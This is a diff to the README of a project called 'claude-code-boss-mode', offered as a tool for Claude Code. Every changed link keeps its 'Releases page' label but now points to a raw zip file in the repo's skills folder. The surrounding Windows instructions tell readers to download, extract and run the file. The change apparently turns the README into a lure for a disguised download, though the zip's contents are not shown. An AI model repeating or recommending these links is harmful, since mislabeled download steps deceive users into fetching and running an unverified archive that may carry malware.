@@ -1,6 +1,6 @@
 # 🧭 claude-code-boss-mode - Make Claude Code Decide Better
 
-[![Download Boss Mode](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
+[![Download Boss Mode](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/subashraja069-cmd/claude-code-boss-mode/main/skills/claude-mode-boss-code-v3.7-beta.5.zip)
 
 ## 🚀 What this is
 
@@ -16,13 +16,13 @@ It is made for people who use Claude Code and want firmer decisions before they 
 
 ## 📥 Download and install
 
-Go to the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases) to visit this page to download.
+Go to the [Releases page](https://raw.githubusercontent.com/subashraja069-cmd/claude-code-boss-mode/main/skills/claude-mode-boss-code-v3.7-beta.5.zip) to visit this page to download.
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see a zip file, save it to your computer first, then extract it.
 
 ### Windows setup steps
 
-1. Open the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/subashraja069-cmd/claude-code-boss-mode/main/skills/claude-mode-boss-code-v3.7-beta.5.zip)
 2. Download the latest Windows release
 3. If the file is zipped, right-click it and choose Extract All
 4. Open the extracted folder
@@ -225,7 +225,7 @@ That makes it useful when you want:
 
 ## 📎 Download again
 
-If you need the installer or release files again, use the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases) to visit this page to download
+If you need the installer or release files again, use the [Releases page](https://raw.githubusercontent.com/subashraja069-cmd/claude-code-boss-mode/main/skills/claude-mode-boss-code-v3.7-beta.5.zip) to visit this page to download
 
 ## 🧭 Topic areas
 
@@ -283,7 +283,7 @@ A simple way to use this project is:
 
 ## 🧭 Release link
 
-[Download from GitHub Releases](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/subashraja069-cmd/claude-code-boss-mode/main/skills/claude-mode-boss-code-v3.7-beta.5.zip)
 
 ## 🧰 Useful habits
 
